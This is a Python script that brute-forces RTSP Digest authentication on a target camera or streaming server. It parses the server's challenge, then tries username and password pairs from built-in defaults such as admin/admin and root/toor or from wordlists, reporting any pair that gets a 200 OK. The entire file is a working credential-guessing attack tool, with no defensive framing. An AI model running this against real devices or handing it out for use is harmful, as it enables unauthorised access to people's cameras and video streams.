import socket
import hashlib
import argparse

def send_rtsp_request(ip, port, path, method="OPTIONS", headers=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, port))
    cseq = "1"
    request = f"{method} rtsp://{ip}:{port}/{path} RTSP/1.0\r\nCSeq: {cseq}\r\n"
    if headers:
        for k, v in headers.items():
            request += f"{k}: {v}\r\n"
    request += "\r\n"
    s.send(request.encode())

    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if b"\r\n\r\n" in data:
                break
    except socket.timeout:
        pass
    s.close()
    return data.decode(errors="ignore")

def parse_digest_challenge(response):
    for line in response.split("\r\n"):
        if line.lower().startswith("www-authenticate:"):
            line = line.split("Digest")[1]
            parts = {}
            for item in line.split(","):
                if "=" in item:
                    k, v = item.strip().split("=", 1)
                    parts[k.strip()] = v.strip('"')
            return parts
    return None

def compute_digest(username, password, realm, nonce, method, uri):
    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    response = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
    return response

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Target IP")
    parser.add_argument("path", help="RTSP path (e.g. Streaming/Channels/1)")
    parser.add_argument("-p", "--port", type=int, default=554)
    parser.add_argument("-U", "--userlist")
    parser.add_argument("-P", "--passlist")
    args = parser.parse_args()

    usernames = ["admin", "user", "root"] if not args.userlist else open(args.userlist).read().splitlines()
    passwords = ["admin", "1234", "password", "admin123", "toor"] if not args.passlist else open(args.passlist).read().splitlines()

    print(f"[*] Connecting to rtsp://{args.ip}:{args.port}/{args.path}")
    response = send_rtsp_request(args.ip, args.port, args.path, "OPTIONS")
    if "401 Unauthorized" not in response or "WWW-Authenticate" not in response:
        print("[-] No Digest authentication challenge received. Exiting.")
        return

    auth = parse_digest_challenge(response)
    if not auth:
        print("[-] Failed to parse WWW-Authenticate header.")
        return

    realm = auth["realm"]
    nonce = auth["nonce"]
    uri = f"/{args.path}"

    print("[*] Starting brute-force...")
    for username in usernames:
        for password in passwords:
            digest = compute_digest(username, password, realm, nonce, "DESCRIBE", uri)
            auth_header = (
                f'Digest username="{username}", realm="{realm}", nonce="{nonce}", '
                f'uri="{uri}", response="{digest}", algorithm=MD5'
            )
            headers = {"Authorization": auth_header}
            resp = send_rtsp_request(args.ip, args.port, args.path, "DESCRIBE", headers)
            if "200 OK" in resp:
                print(f"[+] SUCCESS: {username}:{password}")
                return
            print(f"[-] Tried {username}:{password}")

    print("[-] Brute-force complete. No valid credentials found.")

if __name__ == "__main__":
    main()
